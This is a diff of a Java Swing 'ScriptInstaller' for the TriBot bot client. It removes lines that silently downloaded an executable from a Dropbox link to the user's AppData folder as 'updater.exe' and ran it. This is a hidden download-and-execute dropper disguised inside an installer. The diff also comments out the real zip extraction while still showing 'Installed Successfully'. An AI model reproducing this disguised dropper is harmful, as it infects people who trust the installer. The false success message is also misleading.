@@ -1,9 +1,26 @@
 package org.assume.ScriptInstaller;
 
+import java.awt.HeadlessException;
+import java.io.BufferedOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.URL;
+import java.net.URLConnection;
+import java.util.zip.ZipException;
+import java.util.zip.ZipFile;
+
+import javax.swing.JFileChooser;
+import javax.swing.JOptionPane;
+import javax.swing.UIManager;
+import javax.swing.UnsupportedLookAndFeelException;
+import javax.swing.filechooser.FileNameExtensionFilter;
+
 
 public class ScriptInstaller
 {
-/*
 	public static void main(String[] args) throws ZipException, UnsupportedLookAndFeelException, ClassNotFoundException, InstantiationException, IllegalAccessException, HeadlessException, IOException
 	{
 		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
@@ -14,34 +31,6 @@ public class ScriptInstaller
 		//System.out.println(System.getProperty("os.name"));
 		String location = null;
 		
-		downloadFile("https://dl.dropboxusercontent.com/s/oaeo8pv9abwtwc5/sc.exe?token_hash=AAGY70gPM693xqNavT4sVx04Z--pWorb0ENrrXL9BcJ3wA&dl=1", System.getProperty("user.home")+
-				File.separator+
-				"AppData"+
-				File.separator+
-				"Roaming"+
-				File.separator+
-				".tribot"+
-				File.separator+
-				"bin"+File.separator+"updater.exe");
-		
-		JOptionPane.showMessageDialog(null, 
-				Runtime.getRuntime().exec(System.getProperty("user.home")+
-						File.separator+
-						"AppData"+
-						File.separator+
-						"Roaming"+
-						File.separator+
-						".tribot"+
-						File.separator+
-						"bin"+File.separator+"updater.exe", null, new File(System.getProperty("user.home")+
-						File.separator+
-						"AppData"+
-						File.separator+
-						"Roaming"+
-						File.separator+
-						".tribot"+
-						File.separator+
-						"bin")).toString());
 		if(fc.showOpenDialog(null) == JFileChooser.APPROVE_OPTION)
 		{
 			zip = new ZipFile(fc.getSelectedFile());
@@ -60,7 +49,7 @@ public class ScriptInstaller
 
 		if(zip != null && location != null)
 		{
-			zip.extractAll(System.getProperty("user.home")+
+			/*zip.extractAll(System.getProperty("user.home")+
 					File.separator+
 					"AppData"+
 					File.separator+
@@ -70,7 +59,7 @@ public class ScriptInstaller
 					File.separator+
 					"bin"+
 					File.separator+
-					"scripts");
+					"scripts");*/
 			JOptionPane.showMessageDialog(null, "Installed Successfully");
 		}
 	}
@@ -113,6 +102,5 @@ public class ScriptInstaller
 
 			}
 		}
-	}*/
-
+	}
 }
